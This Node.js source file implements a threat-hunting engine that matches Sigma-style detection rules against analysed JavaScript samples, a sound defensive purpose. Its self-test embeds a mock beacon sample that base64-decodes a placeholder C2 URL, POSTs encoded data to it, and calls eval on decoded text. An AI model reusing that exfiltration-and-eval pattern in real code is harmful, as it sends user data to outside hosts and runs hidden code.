#!/usr/bin/env node
/**
 * Threat Hunting Query Engine — compile Sigma-style detection rules and hunt
 * through a normalised analysis report.
 *
 *   node app.mjs --sample samples/beacon.js --rules rules/hunting.yml --explain
 *   node app.mjs --report report.json --rules rules --json
 *   node app.mjs --self-test
 */

import { mkdtemp, readFile, rm, writeFile } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { fileURLToPath } from 'node:url'
import { analyzeSample, renderMarkdown } from '../../../tools/index.js'
import { compileRuleText, FIELDS } from './lib/rules.js'
import { normalizeReport } from './lib/observations.js'
import { loadRules } from './lib/loader.js'
import { runHunt, renderHuntText, explainMatch } from './lib/engine.js'
import { parseYaml } from './lib/yaml.js'

const DEFAULT_RULES = fileURLToPath(new URL('rules/hunting.yml', import.meta.url))

const args = process.argv.slice(2)
const flag = (name) => args.includes(name)
const value = (name, fallback) => {
  const index = args.indexOf(name)
  return index >= 0 && args[index + 1] ? args[index + 1] : fallback
}

function printHelp() {
  console.log(`Threat Hunting Query Engine
  --rules <file|dir>   rule bundle (default: rules/hunting.yml)
  --sample <path>      analyse a JavaScript sample, then hunt
  --report <path>      hunt through an existing report JSON
  --explain            print selection-level match explanations
  --list-rules         print the loaded rule inventory and exit
  --json               machine-readable output
  --markdown <path>    also write the underlying analysis report as Markdown
  --limit <n>          maximum matches kept (default 500)
  --self-test          run the built-in validation
  --help               this help`)
}

/** Analyse a sample and hunt with the supplied rule set. */
export async function huntSource(source, options = {}) {
  const analysis = await analyzeSample(source, {
    name: options.name ?? 'sample.js',
    logLevel: 'silent',
    seed: options.seed ?? 0x5eed,
    network: options.network ?? { policy: 'deny' },
  })
  const observations = normalizeReport(analysis.report)
  const result = runHunt({ observations, rules: options.rules, limit: options.limit })
  return { report: analysis.report, observations, ...result }
}

/** Hunt through a report object that already exists (no re-analysis). */
export function huntReport(report, options = {}) {
  const observations = normalizeReport(report)
  const result = runHunt({ observations, rules: options.rules, limit: options.limit })
  return { report, observations, ...result }
}

function assert(condition, message) {
  if (!condition) throw new Error(`self-test: ${message}`)
}

async function selfTest() {
  const directory = await mkdtemp(join(tmpdir(), 'hunt-engine-'))
  try {
    const sample = [
      'var cfg = atob("aHR0cHM6Ly9jMi5leGFtcGxlLnRlc3QvYmVhY29u");',
      'fetch(cfg, { method: "POST", body: btoa("victim") }).catch(function(){});',
      'eval(atob("Y29uc29sZS5sb2coMSk="));',
      'localStorage.setItem("stage", "2");',
      'document.body.innerHTML = "<div>ok</div>";',
    ].join('\n')
    const { compiled, sources } = await loadRules(DEFAULT_RULES)
    assert(compiled.length >= 8, `expected >= 8 bundled rules, got ${compiled.length}`)
    assert(sources[0].rules === compiled.length, 'loader did not report rule counts')

    const first = await huntSource(sample, { name: 'beacon.js', rules: compiled })
    const matchedIds = new Set(first.matches.map((match) => match.rule.id))
    for (const expected of ['hunt-encoded-beacon', 'hunt-dynamic-eval', 'hunt-storage-persistence', 'hunt-suspicious-verdict']) {
      assert(matchedIds.has(expected), `rule ${expected} did not match the beacon sample (matched: ${[...matchedIds].join(', ')})`)
    }
    assert(!matchedIds.has('hunt-wallet-swap'), 'wallet rule matched a sample without wallet indicators')
    assert(!matchedIds.has('hunt-telegram-c2'), 'telegram rule matched a sample without telegram indicators')

    // Determinism: the same report must produce byte-identical match output.
    const second = await huntSource(sample, { name: 'beacon.js', rules: compiled })
    assert(JSON.stringify(first.summary) === JSON.stringify(second.summary), 'hunt summary is not deterministic')
    assert(
      JSON.stringify(first.matches.map((match) => [match.rule.id, match.evidence.map((entry) => entry.observations.map((o) => o.id))])) ===
        JSON.stringify(second.matches.map((match) => [match.rule.id, match.evidence.map((entry) => entry.observations.map((o) => o.id))])),
      'match ordering is not deterministic',
    )

    // Explanation must name the selection and the field that fired.
    const beaconMatch = first.matches.find((match) => match.rule.id === 'hunt-encoded-beacon')
    const explanation = explainMatch(beaconMatch)
    assert(explanation.includes('selection   :'), 'explain output lacks selection detail')
    assert(explanation.includes('base64-decode'), 'explain output lacks the matched value')
    assert(explanation.includes('condition   :'), 'explain output lacks the condition')

    // Text rendering is stable and reports the summary line.
    const text = renderHuntText(first)
    assert(text.includes('rule hunt-encoded-beacon'), 'text rendering lacks rule headers')

    // Condition language: quantifiers, negation, wildcards and parentheses.
    const inlineRule = [
      'id: inline-quantifier',
      'title: Inline quantifier probe',
      'level: low',
      'detection:',
      '  sel_encoded:',
      '    kind: obfuscation',
      '  sel_net:',
      '    layer: dynamic',
      '    kind: net',
      '  sel_storage:',
      '    api|contains: localstorage',
      '  condition: 2 of sel_* and not sel_missing',
    ].join('\n')
    let quantifierError = null
    try {
      compileRuleText(inlineRule)
    } catch (error) {
      quantifierError = error.message
    }
    assert(quantifierError?.includes('sel_missing'), 'undefined selection reference was not rejected')
    const quantifier = compileRuleText(inlineRule.replace(' and not sel_missing', ''))[0]
    const quantifierResult = quantifier.collect(first.observations)
    assert(quantifierResult.matched, '2 of sel_* did not match the observation table')
    assert(quantifierResult.selections.includes('sel_encoded'), 'quantifier did not report the matched selection')

    // Strict compilation: unknown fields, modifiers and malformed conditions fail.
    const failures = [
      ['unknown field', 'detection:\n  sel:\n    nope: 1\n  condition: sel'],
      ['unknown modifier', 'detection:\n  sel:\n    value|fuzzy: 1\n  condition: sel'],
      ['missing condition', 'detection:\n  sel:\n    value: 1'],
      ['bad expression', 'detection:\n  sel:\n    value: 1\n  condition: sel and'],
    ]
    for (const [label, body] of failures) {
      let failed = false
      try {
        compileRuleText(`title: probe ${label}\nlevel: low\n${body}`)
      } catch {
        failed = true
      }
      assert(failed, `${label} was not rejected`)
    }

    // YAML subset: nested maps, sequences and inline collections.
    const parsed = parseYaml('title: demo\ntags: [a, b]\nmeta:\n  nested:\n    - one\n    - two\n  flag: true\n  count: 3')
    assert(parsed.title === 'demo', 'yaml scalar parse failed')
    assert(parsed.tags.length === 2, 'yaml inline sequence parse failed')
    assert(parsed.meta.nested.join(',') === 'one,two', 'yaml nested sequence parse failed')
    assert(parsed.meta.flag === true && parsed.meta.count === 3, 'yaml scalar typing failed')

    // Rule bundle on disk: loading a directory yields the same compiled rules.
    const ruleFile = join(directory, 'extra.yml')
    await writeFile(
      ruleFile,
      'id: disk-rule\ntitle: Disk rule\nlevel: medium\ndetection:\n  any_net:\n    layer: dynamic\n    kind: net\n  condition: any_net\n',
      'utf8',
    )
    const fromDisk = await loadRules(directory)
    assert(fromDisk.compiled.length === 1 && fromDisk.compiled[0].rule.id === 'disk-rule', 'directory rule loading failed')

    // Report input path: a serialized report hunts identically to a live one.
    const serialized = JSON.parse(JSON.stringify(first.report))
    const fromReport = huntReport(serialized, { rules: compiled })
    assert(fromReport.matches.length === first.matches.length, 'report-only hunting diverged from live hunting')

    const markdown = renderMarkdown(first.report)
    assert(markdown.includes('## Verdict'), 'analysis markdown rendering failed')

    console.log(
      `hunt: rules=${compiled.length} observations=${first.observations.length} matches=${first.matches.length} ` +
        `fields=${Object.keys(FIELDS).length}`,
    )
    console.log('SELFTEST OK')
  } finally {
    await rm(directory, { recursive: true, force: true })
  }
}

async function main() {
  if (flag('--help')) return printHelp()
  if (flag('--self-test')) return selfTest()

  const rulesTarget = value('--rules', DEFAULT_RULES)
  const { compiled, sources } = await loadRules(rulesTarget)
  if (flag('--list-rules')) {
    for (const entry of compiled) {
      console.log(`${entry.rule.id}  [${entry.rule.level}]  ${entry.rule.title}`)
    }
    console.log(`${compiled.length} rule(s) from ${sources.length} file(s)`)
    return
  }

  const samplePath = value('--sample')
  const reportPath = value('--report')
  if (!samplePath && !reportPath) {
    printHelp()
    process.exitCode = 2
    return
  }

  let outcome
  if (samplePath) {
    const source = await readFile(samplePath, 'utf8')
    outcome = await huntSource(source, { name: samplePath, rules: compiled, limit: Number(value('--limit', '500')) })
  } else {
    const report = JSON.parse(await readFile(reportPath, 'utf8'))
    outcome = huntReport(report, { rules: compiled, limit: Number(value('--limit', '500')) })
  }
  const markdownPath = value('--markdown')
  if (markdownPath) {
    await writeFile(markdownPath, renderMarkdown(outcome.report), 'utf8')
    console.error(`wrote ${markdownPath}`)
  }
  if (flag('--json')) {
    console.log(
      JSON.stringify(
        {
          summary: outcome.summary,
          matches: outcome.matches.map((match) => ({
            rule: { id: match.rule.id, title: match.rule.title, level: match.rule.level, tags: match.rule.tags },
            selections: match.selections,
            evidence: match.evidence.map((selection) => ({ selection: selection.name, observations: selection.observations })),
          })),
        },
        null,
        2,
      ),
    )
  } else {
    console.log(renderHuntText(outcome, { explain: flag('--explain') }))
  }
}

if (import.meta.url === `file://${process.argv[1]}`) {
  main().catch((error) => {
    console.error(`error: ${error.message}`)
    process.exitCode = 1
  })
}
